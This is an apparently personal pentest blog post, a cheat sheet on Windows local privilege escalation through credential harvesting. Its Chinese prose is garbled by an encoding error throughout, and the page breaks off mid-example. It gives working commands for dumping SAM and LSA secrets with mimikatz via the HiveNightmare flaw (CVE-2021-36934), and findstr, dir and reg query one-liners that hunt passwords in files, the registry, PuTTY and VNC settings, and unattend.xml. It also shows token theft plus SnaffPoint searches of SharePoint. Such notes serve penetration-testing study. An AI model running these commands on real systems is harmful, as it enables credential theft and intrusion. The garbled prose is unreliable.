<!DOCTYPE html><html lang="en">
  <head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>Windows ææƒçŸ¥è¯†ç‚¹ - DumKiy's blog</title>

<meta name="description" content="Windows æœ¬åœ°ææƒåˆ©ç”¨å¯¼å‡ºæˆ–æŸ¥æ‰¾å¯†ç ææƒä¸»è¦æ€è·¯åœ¨äºä½¿ç”¨ mimikatz æˆ–è€…ä»é…ç½®æ–‡ä»¶ã€æ³¨å†Œè¡¨é¡¹ä¸­æ’æŸ¥å¯†ç ã€‚SAM and SYSTEM files(win10 åŠä»¥ä¸‹)å®‰å…¨å¸æˆ·ç®¡ç†å™¨ (SAM)ï¼Œé€šå¸¸æ˜¯å®‰å…¨å¸æˆ·ç®¡ç†å™¨ï¼Œæ˜¯ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ã€‚ç”¨æˆ·å¯†ç ä»¥å“ˆå¸Œæ ¼å¼å­˜å‚¨åœ¨æ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­ï¼Œä½œä¸º LM å“ˆå¸Œæˆ– NT...">
<link rel="canonical" href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">

<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">

<meta name="theme-color" content="#ffffff">
<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->

<!-- end custom head snippets -->
<script>(function() {
  window.isArray = function(val) {
    return Object.prototype.toString.call(val) === '[object Array]';
  };
  window.isString = function(val) {
    return typeof val === 'string';
  };

  window.hasEvent = function(event) {
    return 'on'.concat(event) in window.document;
  };

  window.isOverallScroller = function(node) {
    return node === document.documentElement || node === document.body || node === window;
  };

  window.isFormElement = function(node) {
    var tagName = node.tagName;
    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
  };

  window.pageLoad = (function () {
    var loaded = false, cbs = [];
    window.addEventListener('load', function () {
      var i;
      loaded = true;
      if (cbs.length > 0) {
        for (i = 0; i < cbs.length; i++) {
          cbs[i]();
        }
      }
    });
    return {
      then: function(cb) {
        cb && (loaded ? cb() : (cbs.push(cb)));
      }
    };
  })();
})();
(function() {
  window.throttle = function(func, wait) {
    var args, result, thisArg, timeoutId, lastCalled = 0;

    function trailingCall() {
      lastCalled = new Date;
      timeoutId = null;
      result = func.apply(thisArg, args);
    }
    return function() {
      var now = new Date,
        remaining = wait - (now - lastCalled);

      args = arguments;
      thisArg = this;

      if (remaining <= 0) {
        clearTimeout(timeoutId);
        timeoutId = null;
        lastCalled = now;
        result = func.apply(thisArg, args);
      } else if (!timeoutId) {
        timeoutId = setTimeout(trailingCall, remaining);
      }
      return result;
    };
  };
})();
(function() {
  var Set = (function() {
    var add = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (data[i] === item) {
          return;
        }
      }
      this.size ++;
      data.push(item);
      return data;
    };

    var Set = function(data) {
      this.size = 0;
      this._data = [];
      var i;
      if (data.length > 0) {
        for (i = 0; i < data.length; i++) {
          add.call(this, data[i]);
        }
      }
    };
    Set.prototype.add = add;
    Set.prototype.get = function(index) { return this._data[index]; };
    Set.prototype.has = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (this.get(i) === item) {
          return true;
        }
      }
      return false;
    };
    Set.prototype.is = function(map) {
      if (map._data.length !== this._data.length) { return false; }
      var i, j, flag, tData = this._data, mData = map._data;
      for (i = 0; i < tData.length; i++) {
        for (flag = false, j = 0; j < mData.length; j++) {
          if (tData[i] === mData[j]) {
            flag = true;
            break;
          }
        }
        if (!flag) { return false; }
      }
      return true;
    };
    Set.prototype.values = function() {
      return this._data;
    };
    return Set;
  })();

  window.Lazyload = (function(doc) {
    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
    var createNode = function(name, attrs) {
      var node = doc.createElement(name), attr;
      for (attr in attrs) {
        if (attrs.hasOwnProperty(attr)) {
          node.setAttribute(attr, attrs[attr]);
        }
      }
      return node;
    };
    var end = function(type, url) {
      var s, q, qi, cbs, i, j, cur, val, flag;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        s[url] = true;
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (cur.urls.has(url)) {
            qi = cur, val = qi.urls.values();
            qi && (cbs = qi.callbacks);
            for (flag = true, j = 0; j < val.length; j++) {
              cur = val[j];
              if (!s[cur]) {
                flag = false;
              }
            }
            if (flag && cbs && cbs.length > 0) {
              for (j = 0; j < cbs.length; j++) {
                cbs[j].call(context);
              }
              qi.load = true;
            }
          }
        }
      }
    };
    var load = function(type, urls, callback) {
      var s, q, qi, node, i, cur,
        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (_urls.is(cur.urls)) {
            qi = cur;
            break;
          }
        }
        val = _urls.values();
        if (qi) {
          callback && (qi.load || qi.callbacks.push(callback));
          callback && (qi.load && callback());
        } else {
          q.push({
            urls: _urls,
            callbacks: callback ? [callback] : [],
            load: false
          });
          for (i = 0; i < val.length; i++) {
            node = null, url = val[i];
            if (s[url] === undefined) {
              (type === 'js' ) && (node = createNode('script', { src: url }));
              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
              if (node) {
                node.onload = (function(type, url) {
                  return function() {
                    end(type, url);
                  };
                })(type, url);
                (doc.head || doc.body).appendChild(node);
                s[url] = false;
              }
            }
          }
        }
      }
    };
    return {
      js: function(url, callback) {
        load('js', url, callback);
      },
      css: function(url, callback) {
        load('css', url, callback);
      }
    };
  })(this.document);
})();
</script><script>
  (function() {
    var TEXT_VARIABLES = {
      version: '2.2.6',
      sources: {
        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
        gitalk: {
          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
        },
        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
      },
      site: {
        toc: {
          selectors: 'h1,h2,h3,h4'
        }
      },
      paths: {
        search_js: '/assets/search.js'
      }
    };
    window.TEXT_VARIABLES = TEXT_VARIABLES;
  })();
</script>
</head>
  <body>
    <div class="root" data-is-touch="false">
      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">

      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
      <div class="header__title">
        <div class="header__brand"><?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
 "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
 preserveAspectRatio="xMidYMid meet">
<metadata>
Created by potrace 1.14, written by Peter Selinger 2001-2017
</metadata>
<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)"
fill="#000000" stroke="none">
<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
684 10 1799 11 l1755 0 57 -23z"/>
<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
918 -31 16 -53 17 -87 3z"/>
<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"/>
</g>
</svg>
<a title="Watch And Learn
" href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="/Resources.html">Resources</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
      </nav></div>
  </header>
</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">

              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
</aside></div>

              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->

<!-- end custom main top snippet -->
<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>Windows ææƒçŸ¥è¯†ç‚¹</h1></header><span class="split-space">&nbsp;</span>
          <a class="edit-on-github"
            title="Edit on Github"
            href="https://github.com/user_name/repo_name/tree/master/_posts/2023-11-22-Windows-ææƒçŸ¥è¯†ç‚¹.md">
            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="Windows ææƒçŸ¥è¯†ç‚¹"><div class="article__info clearfix">
      <div class="right-col">
         <ul class="menu"> <span style="font-size: 1.2em;">ğŸ“‚</span><li>
              <a class="button button--secondary button--pill button--sm"
                href="/categories.html?tag=Pentest">Pentest</a>
            </li></ul>
      </div>
      <div class="right-col"><ul class="left-col menu"> <span style="font-size: 1.2em;">ğŸ“Œ</span><li>
              <a class="button button--secondary button--pill button--sm"
                href="/tags.html?tag=windows">windows</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/tags.html?tag=LPE">LPE</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/tags.html?tag=Info+gathering">Info gathering</a>
            </li></ul></div><ul class="left-col menu"><li><i class="far fa-calendar-alt"></i> <span>Nov 20, 2023</span>
            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2023-11-20T13:34:21+08:00">
    <meta itemprop="keywords" content="windows,LPE,Info gathering"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->

<!-- end custom article top snippet -->
<div class="article__content" itemprop="articleBody"><h1 id="windows-æœ¬åœ°ææƒ">Windows æœ¬åœ°ææƒ</h1>
<h2 id="åˆ©ç”¨å¯¼å‡ºæˆ–æŸ¥æ‰¾å¯†ç ææƒ">åˆ©ç”¨å¯¼å‡ºæˆ–æŸ¥æ‰¾å¯†ç ææƒ</h2>
<p>ä¸»è¦æ€è·¯åœ¨äºä½¿ç”¨ mimikatz æˆ–è€…ä»é…ç½®æ–‡ä»¶ã€æ³¨å†Œè¡¨é¡¹ä¸­æ’æŸ¥å¯†ç ã€‚</p>

<h3 id="sam-and-system-fileswin10-åŠä»¥ä¸‹">SAM and SYSTEM files(win10 åŠä»¥ä¸‹)</h3>
<p>å®‰å…¨å¸æˆ·ç®¡ç†å™¨ (SAM)ï¼Œé€šå¸¸æ˜¯å®‰å…¨å¸æˆ·ç®¡ç†å™¨ï¼Œæ˜¯ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ã€‚<br />
ç”¨æˆ·å¯†ç ä»¥å“ˆå¸Œæ ¼å¼å­˜å‚¨åœ¨æ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­ï¼Œä½œä¸º LM å“ˆå¸Œæˆ– NTLM å“ˆå¸Œã€‚<br />
è¯¥æ–‡ä»¶ä½äº %SystemRoot%/system32/config/SAM ä¸­ï¼Œå¹¶å®‰è£…åœ¨ HKLM/SAM ä¸Šã€‚</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Usually %SYSTEMROOT% = C:\Windows</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\system</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SYSTEM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\system</span><span class="w">
</span></code></pre></div></div>

<p><strong>ç›´æ¥ä½¿ç”¨ mimikatz æå–å³å¯ï¼Œæ— éœ€ä½¿ç”¨ pwddump</strong></p>

<h3 id="hivenightmarewindows-10-and-11">HiveNightmare(Windows 10 and 11)</h3>
<p>ä¸å½±å“ Serverã€‚</p>

<blockquote>
  <p>CVE-2021â€“36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user</p>
</blockquote>

<p>ä½¿ç”¨ <code class="language-plaintext highlighter-rouge">icacls</code> å‘½ä»¤æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\System32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">icacls</span><span class="w"> </span><span class="nx">config\SAM</span><span class="w">
</span><span class="n">config\SAM</span><span class="w"> </span><span class="nx">BUILTIN\Administrators:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
           </span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\SYSTEM:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
           </span><span class="n">BUILTIN\Users:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span><span class="w">    </span><span class="err">&lt;</span><span class="o">--</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">wrong</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">regular</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="nx">should</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">read</span><span class="w"> </span><span class="nx">access</span><span class="o">!</span><span class="w">
</span></code></pre></div></div>

<p>Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">token::whoami</span><span class="w"> </span><span class="nx">/full</span><span class="w">

</span><span class="c"># List shadow copies available</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">misc::shadowcopies</span><span class="w">

</span><span class="c"># Extract account from SAM databases</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lsadump::sam</span><span class="w"> </span><span class="nx">/system:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span><span class="w"> </span><span class="nx">/sam:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM</span><span class="w">

</span><span class="c"># Extract secrets from SECURITY</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lsadump::secrets</span><span class="w"> </span><span class="nx">/system:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span><span class="w"> </span><span class="nx">/security:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li><a href="https://teamssix.com/210725-074847.html#!">ã€æ¼æ´å¤ç°ã€‘CVE-2021-36934 Windows ææƒæ¼æ´å¤ç° - TeamsSix</a></li>
</ul>

<h3 id="æœç´¢æ–‡ä»¶å†…å®¹ä¸­çš„-password">æœç´¢æ–‡ä»¶å†…å®¹ä¸­çš„ password</h3>
<p>åœ¨ .xml, .ini, .txt .config ç­‰æ–‡ä»¶ä¸­æœç´¢ Password</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/SI</span><span class="w"> </span><span class="nx">/M</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w">
</span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/si</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">results.txt</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/spin</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.*</span><span class="w">
</span></code></pre></div></div>

<p>åœ¨è¿œç¨‹åœ°å€ä¾‹å¦‚ SMB Shares æˆ– SharePoint æœç´¢</p>

<ul>
  <li>Search passwords in SharePoint: <a href="https://github.com/nheiniger/SnaffPoint">nheiniger/SnaffPoint</a> (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6)</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># First, retrieve a token</span><span class="w">
</span><span class="c">## Method 1: using SnaffPoint binary</span><span class="w">
</span><span class="nv">$token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">.</span><span class="n">\GetBearerToken.exe</span><span class="w"> </span><span class="nx">https://your.sharepoint.com</span><span class="p">)</span><span class="w">
</span><span class="c">## Method 2: using AADInternals</span><span class="w">
</span><span class="n">Install-Module</span><span class="w"> </span><span class="nx">AADInternals</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">CurrentUser</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">AADInternals</span><span class="w">
</span><span class="nv">$token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-AADIntAccessToken</span><span class="w"> </span><span class="nt">-ClientId</span><span class="w"> </span><span class="s2">"9bc3ab49-b65d-410a-85ad-de819febfddc"</span><span class="w"> </span><span class="nt">-Tenant</span><span class="w"> </span><span class="s2">"your.onmicrosoft.com"</span><span class="w"> </span><span class="nt">-Resource</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="p">)</span><span class="w">

</span><span class="c"># Second, search on Sharepoint</span><span class="w">
</span><span class="c">## Method 1: using search strings in ./presets dir</span><span class="w">
</span><span class="o">.</span><span class="n">\SnaffPoint.exe</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nv">$token</span><span class="w">
</span><span class="c">## Method 2: using search string in command line</span><span class="w">
</span><span class="c">### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference</span><span class="w">
</span><span class="o">.</span><span class="n">\SnaffPoint.exe</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nv">$token</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nt">-q</span><span class="w"> </span><span class="s2">"filename:.config"</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>Search passwords in SMB Shares: <a href="https://github.com/SnaffCon/Snaffler">SnaffCon/Snaffler</a></li>
</ul>

<h3 id="æœç´¢å’Œ-password-ç›¸å…³çš„æ–‡ä»¶å">æœç´¢å’Œ password ç›¸å…³çš„æ–‡ä»¶å</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> <span class="na">/S /B </span><span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.txt <span class="o">==</span> <span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.xml <span class="o">==</span> <span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.ini <span class="o">==</span> <span class="o">*</span><span class="kd">cred</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="kd">vnc</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span>.config<span class="o">*</span>
<span class="nb">where</span> <span class="na">/R </span><span class="kd">C</span>:\ <span class="kd">user</span>.txt
<span class="nb">where</span> <span class="na">/R </span><span class="kd">C</span>:\ <span class="o">*</span>.ini
</code></pre></div></div>

<h3 id="æœç´¢å’Œ-password-ç›¸å…³çš„æ³¨å†Œè¡¨">æœç´¢å’Œ password ç›¸å…³çš„æ³¨å†Œè¡¨</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">
</span><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w"> </span><span class="c"># Windows Autologin</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"DefaultUserName DefaultDomainName DefaultPassword"</span><span class="w"> 
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SYSTEM\Current\ControlSet\Services\SNMP"</span><span class="w"> </span><span class="c"># SNMP parameters</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\SimonTatham\PuTTY\Sessions"</span><span class="w"> </span><span class="c"># Putty clear text proxy credentials</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\ORL\WinVNC3\Password"</span><span class="w"> </span><span class="c"># VNC credentials</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">password</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span></code></pre></div></div>

<h3 id="åœ¨-unattendxml-ä¸­æœç´¢å¯†ç ">åœ¨ unattend.xml ä¸­æœç´¢å¯†ç </h3>
<p>è‡ªåŠ¨å®‰è£…å…è®¸ç¨‹åºåœ¨ä¸éœ€è¦ç®¡ç†å‘˜å…³æ³¨ä¸‹è‡ªåŠ¨å®‰è£…ã€‚è¿™ç§è§£å†³æ–¹æ¡ˆç”¨äºåœ¨æ‹¥æœ‰è¾ƒå¤šé›‡å‘˜å’Œæ—¶é—´ç´§ç¼ºçš„è¾ƒå¤§å‹ç»„ç»‡ä¸­éƒ¨ç½²ç¨‹åºã€‚å¦‚æœç®¡ç†å‘˜æ²¡æœ‰è¿›è¡Œæ¸…ç†çš„è¯ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸€ä¸ªåä¸ºUnattendçš„XMLæ–‡ä»¶æ®‹å­˜åœ¨ç³»ç»Ÿä¸Šã€‚è¿™ä¸ªXMLæ–‡ä»¶åŒ…å«æ‰€æœ‰åœ¨å®‰è£…ç¨‹åºè¿‡ç¨‹ä¸­çš„é…ç½®ï¼ŒåŒ…æ‹¬ä¸€äº›æœ¬åœ°ç”¨æˆ·çš„é…ç½®ï¼Œä»¥åŠç®¡ç†å‘˜è´¦æˆ·ã€‚</p>

<p>Location of the unattend.xml files.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\Panther\Unattend.xml</span><span class="w">
</span><span class="n">C:\Windows\Panther\Unattend\Unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\system32\sysprep.inf</span><span class="w">
</span><span class="n">C:\Windows\system32\sysprep\sysprep.xml</span><span class="w">
</span></code></pre></div></div>

<p>Display the content of these files with <code class="language-plaintext highlighter-rouge">dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</code>.</p>

<p>Example content</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&lt;</span><span class="n">component</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"Microsoft-Windows-Shell-Setup"</span><span class="w"> </span><span class="n">publicKeyToken</span><span class="o">=</span><span class="s2">"31bf3856ad364e35"</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">"neutral"</span><span class="w"> </span><span class="n">versionScope</span><span class="o">=</span><span class="s2">"nonSxS"</span><span class="w"> </span><span class="n">processorArchitecture</span><span class="o">=</span><span class="s2">"amd64"</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">AutoLogon</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Password</span><span class="err">&gt;</span><span class="nx">U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo</span><span class="o">==</span><span class="err">&lt;</span><span class="n">/Password</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Enabled</span><span class="err">&gt;</span><span class="nx">true</span><span class="err">&lt;</span><span class="nx">/Enabled</span><span class="err">&gt;</span><span class="w">
